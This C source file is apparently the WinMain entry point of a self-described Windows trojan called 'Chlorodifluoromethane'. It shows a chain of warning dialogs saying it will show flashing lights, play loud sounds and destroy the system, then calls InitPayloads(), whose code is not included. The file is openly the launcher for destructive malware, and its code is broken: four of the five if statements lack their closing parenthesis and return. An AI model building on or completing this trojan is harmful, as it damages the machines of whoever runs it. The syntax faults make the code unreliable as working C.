#include "include.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    if
        (
            MessageBox
            (
                NULL,
                L"This is a Trojan. You want to run?",
                L"Chlorodifluoromethane - First warning",
                MB_ICONWARNING | MB_YESNO
            ) != IDYES
        ) return 1;

    if
        (
            MessageBox
            (
                NULL,
                L"This gonna show flashing lights, loud sounds and strong language",
                L"Chlorodifluoromethane - Seconds warning",
                MB_ICONWARNING | MB_YESNO
            ) != IDYES

    if
        (
            MessageBox
            (
                NULL,
                L"Gonna destroy your system",
                L"Chlorodifluoromethane - Third warning",
                MB_ICONWARNING | MB_YESNO
            ) != IDYES

    if
        (
            MessageBox
            (
                NULL,
                L"If your machine was damages... your problem",
                L"Chlorodifluoromethane - Fourth warning",
                MB_ICONWARNING | MB_YESNO
            ) != IDYES

  if
        (
            MessageBox
            (
                NULL,
                L"ARE YOU REALLY SURE THAT YOU WANT TO RUN???",
                L"Chlorodifluoromethane - Last warning",
                MB_ICONWARNING | MB_YESNO
            ) != IDYES
              
    InitPayloads();
    return 0;
}
